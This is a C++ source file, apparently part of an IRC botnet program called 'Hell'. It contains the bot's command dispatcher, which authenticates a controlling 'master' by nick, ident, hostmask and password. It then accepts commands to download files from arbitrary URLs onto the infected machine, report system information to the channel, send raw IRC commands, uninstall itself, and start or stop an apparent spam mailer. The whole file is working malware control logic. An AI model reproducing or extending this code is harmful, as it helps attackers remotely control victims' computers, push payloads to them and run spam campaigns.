// CMain class

#include "Include.h"
#include "Hell.h"



bool CMain::CheckUser(string sUser)
{
	if (sUser.substr(1,sUser.find("!")-1).compare(Hell->cIRC.cConf.cMasterNick) == 0 && 
		sUser.substr(sUser.find("!")+1,sUser.find("@")-sUser.find("!")-1).compare(Hell->cIRC.cConf.cMasterIdent) == 0 &&
		sUser.substr(sUser.find("@")+1,sUser.length()-sUser.find("@")).compare(Hell->cIRC.cConf.cMasterHostmask) == 0) {
		return true; }
	return false;	
}
void CMain::ExecuteCmd(vector <string> iBuffer)
{
	if (!sLogin) {
		if (iBuffer[3].compare(7,iBuffer[3].length()-7,"login") == 0 && iBuffer.size() > 4) {

			if (iBuffer[4] == Hell->cIRC.cConf.cBotPass)
			{	
			    if (CheckUser(iBuffer[0])) {
				    sLogin = true;
				    Hell->cIRC.SendData("PRIVMSG %s :Accepted.\r\n",Hell->cIRC.cConf.cChan.c_str());
				}
			}

		} 
	}
	
	if (sTopic && CheckUser(iBuffer[0]) || sLogin && CheckUser(iBuffer[0]) || sTopic && sOnJoinTopic) {
		//sTopic = true;
		if (iBuffer[3].compare(7,iBuffer[3].length()-7,"disconnect") == 0) {
			Hell->cIRC.IRCRunning = false;
			Hell->botRunning = false;
		}
		else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"reconnect") == 0) {
			Hell->cIRC.IRCRunning = false;
		}
		else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"sysinfo") == 0) {
			Hell->cIRC.SendData("PRIVMSG %s : %s \r\n",Hell->cIRC.cConf.cChan.c_str(), sysinfo(buff));
		}
		else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"download") == 0 && iBuffer.size() > 6) {
			Hell->hDownload.sUrl = iBuffer[4];
			Hell->hDownload.sDest = iBuffer[5];
			Hell->hDownload.sUpdate = iBuffer[6];
			Hell->hDownload.Start(true);
		}
		else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"botcash") == 0 && iBuffer.size() > 4) {
			Hell->hDownload.sBotcash = iBuffer[4];
			Botcash();
		}
		else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"remove") == 0) {
			Hell->hRegcheck.Kill();	
			Hell->hRegcheck.Uninstall();
			Hell->botRunning = false;
		}
		else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"raw") == 0 && iBuffer.size() > 6) {
			Hell->cIRC.SendData("%s %s %s %s\r\n",iBuffer[4].c_str(),Hell->cIRC.cConf.cChan.c_str(),iBuffer[5].c_str(),iBuffer[6].c_str());
		}
		else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"mailstop") == 0 && iBuffer.size() > 4) {
			Hell->Hellmail.Start(false);
		}
		else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"mailstart") == 0 && iBuffer.size() > 4) {
			Hell->Hellmail.Start(true);
		}
		if (sOnJoinTopic) {
			iBuffer.insert(iBuffer.begin(),sTemp);			
			sOnJoinTopic = true;
			//sTopic = true;
		}
		
	}
	
}
 